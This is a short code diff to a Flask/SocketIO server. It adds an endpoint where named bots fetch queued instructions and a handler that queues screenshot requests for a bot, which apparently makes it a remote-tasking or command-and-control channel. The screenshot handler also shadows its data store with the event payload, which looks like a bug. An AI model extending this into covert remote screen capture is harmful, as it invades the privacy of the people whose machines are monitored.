@@ -376,17 +376,37 @@ def update_log():
 
     return jsonify({"success": True, "value": contents})
 
+# Bot get request
+@app.route("/botwhat/<bot>")
+def bot_instruct(bot):
+    bot = bot.strip()
+    if bot not in data["bot"]:
+        return abort(404)
+        
+    try:
+        return jsonify(data["bot"][bot]["do"])
+    except:
+        return abort(500)
+
 # socketio
 #
 
 @socketio.on('connect')
 def handle_connect():
-    print('Client connected') # temp
+    print('Client connected')
 
 @socketio.on('join')
 def handle_join(bot_name):
     join_room(bot_name)
     print(f'Client joined room: {bot_name}')
+
+@socketio.on("screenshot")
+def screenshot_request(data):
+    bot = data.get("bot")
+    print(f"Screenshot requested for {bot}")
+    data["bot"][bot].setdefault("do", {})
+    data["bot"][bot]["do"]["screenshot"] = True
+    
 
 if __name__ == "__main__":
     #app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
